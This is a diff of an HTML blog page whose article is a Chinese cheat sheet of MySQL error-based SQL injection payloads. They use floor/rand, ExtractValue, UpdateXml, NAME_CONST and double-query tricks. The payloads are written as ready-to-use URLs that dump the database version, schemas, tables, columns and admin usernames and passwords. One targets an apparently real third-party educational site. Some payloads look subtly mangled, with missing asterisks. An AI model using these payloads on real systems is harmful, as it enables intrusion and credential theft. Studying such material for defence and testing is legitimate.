@@ -6,17 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本 1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (s">
+    <meta name="description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本  1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (">
 <meta name="keywords" content="Mysql,sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mysql暴错注入方法整理">
 <meta property="og:url" content="http://yoursite.com/2016/05/18/mysqlburstinjection/index.html">
 <meta property="og:site_name" content="Windy&#39;s blog">
-<meta property="og:description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本 1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (s">
-<meta property="og:updated_time" content="2017-01-18T04:47:04.000Z">
+<meta property="og:description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本  1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (">
+<meta property="og:updated_time" content="2017-08-27T13:49:01.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql暴错注入方法整理">
-<meta name="twitter:description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本 1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (s">
+<meta name="twitter:description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本  1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (">
     
     
         
@@ -95,27 +95,7 @@
   <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&name=Mysql暴错注入方法整理&description=&lt;p&gt;mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法&lt;/p&gt;
-&lt;h2 id=&#34;1、通过floor暴错&#34;&gt;&lt;a href=&#34;#1、通过floor暴错&#34; class=&#34;headerlink&#34; title=&#34;1、通过floor暴错&#34;&gt;&lt;/a&gt;1、通过floor暴错&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;数据库版本&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;简单办法暴库&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=info()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;连接用户&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;连接数据库&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;暴库&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;暴表&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;/ul&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&name=Mysql暴错注入方法整理&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -174,43 +154,46 @@
   <div class="content" itemprop="articleBody">
     <p>mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法</p>
 <h2 id="1、通过floor暴错"><a href="#1、通过floor暴错" class="headerlink" title="1、通过floor暴错"></a>1、通过floor暴错</h2><ul>
-<li><p>数据库版本</p>
+<li>数据库版本</li>
+</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
-<li><p>简单办法暴库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=info()</div></pre></td></tr></table></figure>
-</li>
-<li><p>连接用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
-<li><p>连接数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
-<li><p>暴库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
-<li><p>暴表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<a id="more"></a>
 <ul>
-<li><p>暴字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
-<li><p>暴内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
-</li>
+<li>简单办法暴库</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=info()</div></pre></td></tr></table></figure>
+<ul>
+<li>连接用户</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
+<ul>
+<li>连接数据库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
+<ul>
+<li>暴库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
+<ul>
+<li>暴表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
+<ul>
+<li>暴字段</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
+<ul>
+<li>暴内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure>
 <h2 id="2、ExtractValue-有长度限制-最长32位"><a href="#2、ExtractValue-有长度限制-最长32位" class="headerlink" title="2、ExtractValue(有长度限制,最长32位)"></a>2、ExtractValue(有长度限制,最长32位)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))</div></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))</div></pre></td></tr></table></figure>
 <h2 id="3、UpdateXml-有长度限制-最长32位"><a href="#3、UpdateXml-有长度限制-最长32位" class="headerlink" title="3、UpdateXml(有长度限制,最长32位)"></a>3、UpdateXml(有长度限制,最长32位)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</div></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</div></pre></td></tr></table></figure>
 <h2 id="4、NAME-CONST-适用于低版本"><a href="#4、NAME-CONST-适用于低版本" class="headerlink" title="4、NAME_CONST(适用于低版本)"></a>4、NAME_CONST(适用于低版本)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select++from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--</div></pre></td></tr></table></figure>
 <h2 id="5、Error-based-Double-Query-Injection-http-www-vaibs-in-error-based-double-query-injection"><a href="#5、Error-based-Double-Query-Injection-http-www-vaibs-in-error-based-double-query-injection" class="headerlink" title="5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)"></a>5、Error based Double Query Injection (<a href="http://www.vaibs.in/error-based-double-query-injection/" target="_blank" rel="external">http://www.vaibs.in/error-based-double-query-injection/</a>)</h2><ul>
-<li>数据库版本<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)2))+having+min(0)+or+1</div></pre></td></tr></table></figure></li>
+<li>数据库版本</li>
 </ul>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.yangjiye.top/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)2))+having+min(0)+or+1</div></pre></td></tr></table></figure>
   </div>
 </article>
 
@@ -256,27 +239,7 @@
   <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&name=Mysql暴错注入方法整理&description=&lt;p&gt;mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法&lt;/p&gt;
-&lt;h2 id=&#34;1、通过floor暴错&#34;&gt;&lt;a href=&#34;#1、通过floor暴错&#34; class=&#34;headerlink&#34; title=&#34;1、通过floor暴错&#34;&gt;&lt;/a&gt;1、通过floor暴错&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;数据库版本&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;简单办法暴库&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=info()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;连接用户&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;连接数据库&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;暴库&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;暴表&lt;/p&gt;
-&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;/li&gt;
-&lt;/ul&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&name=Mysql暴错注入方法整理&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
